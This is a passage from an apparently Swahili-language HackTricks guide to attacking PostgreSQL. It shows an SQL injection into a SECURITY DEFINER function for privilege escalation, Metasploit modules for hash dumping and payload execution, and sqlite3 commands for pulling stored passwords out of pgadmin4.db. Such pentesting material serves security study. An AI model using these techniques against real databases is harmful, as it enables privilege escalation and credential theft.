subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Kama [**inavyoelezwa katika nyaraka**](https://www.postgresql.org/docs/current/sql-createfunction.html) kazi yenye **SECURITY DEFINER inatekelezwa** kwa mamlaka ya **mtumiaji anayemiliki**. Kwa hiyo, ikiwa kazi hiyo ni **dhaifu kwa SQL Injection** au inafanya **hatua za kipekee na params zinazodhibitiwa na mshambuliaji**, inaweza kutumiwa kwa **kuinua mamlaka ndani ya postgres**.

Katika mstari wa 4 wa msimbo uliopita unaweza kuona kuwa kazi hiyo ina bendera ya **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Kisha **tekeleza amri**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Pita Burteforce na PL/pgSQL

**PL/pgSQL** ni **lugha kamili ya programu** ambayo inatoa udhibiti wa taratibu zaidi ikilinganishwa na SQL. Inawezesha matumizi ya **mizunguko** na **muundo wa udhibiti** mwingine kuimarisha mantiki ya programu. Aidha, **taarifa za SQL** na **triggers** zina uwezo wa kuita kazi zilizoundwa kwa kutumia **lugha ya PL/pgSQL**. Ushirikiano huu unaruhusu njia kamili na yenye uwezo zaidi ya programu na otomatiki ya hifadhidata.\
**Unaweza kutumia lugha hii kwa kudanganya PostgreSQL ili kuvunja nguvu za siri za watumiaji.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### kurekodi

Ndani ya faili ya _**postgresql.conf**_ unaweza kuwezesha kurekodi kwa postgresql kwa kubadilisha:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Kisha, **zindua tena huduma**.

### pgadmin

[pgadmin](https://www.pgadmin.org) ni jukwaa la utawala na maendeleo kwa PostgreSQL.\
Unaweza kupata **maneno ya siri** ndani ya faili ya _**pgadmin4.db**_.\
Unaweza kuyafichua kwa kutumia kazi ya _**decrypt**_ ndani ya hati: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Uthibitishaji wa wateja katika PostgreSQL unasimamiwa kupitia faili ya usanidi inayoitwa **pg_hba.conf**. Faili hii ina rekodi kadhaa, kila moja ikielezea aina ya uhusiano, kikoa cha anwani ya IP ya mteja (ikiwa inatumika), jina la database, jina la mtumiaji, na njia ya uthibitishaji ya kutumia kwa uhusiano unaolingana. Rekodi ya kwanza inayolingana na aina ya uhusiano, anwani ya IP ya mteja, database iliyotakiwa, na jina la mtumiaji hutumiwa kwa uthibitishaji. Hakuna suluhisho mbadala au urejesho ikiwa uthibitishaji unashindwa. Ikiwa hakuna rekodi inayolingana, ufikiaji unakataliwa.

Njia za uthibitishaji kwa msingi wa nenosiri zinazopatikana katika pg_hba.conf ni **md5**, **crypt**, na **password**. Njia hizi zinatofautiana katika jinsi nenosiri linavyotumwa: kwa umbo la MD5, limefichwa kwa crypt, au kwa maandishi wazi. Ni muhimu kuzingatia kuwa njia ya crypt haiwezi kutumika na nywila ambazo zimefichwa katika pg_authid.

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** wa kazi zinazotumia zana za jamii zilizoendelea zaidi duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
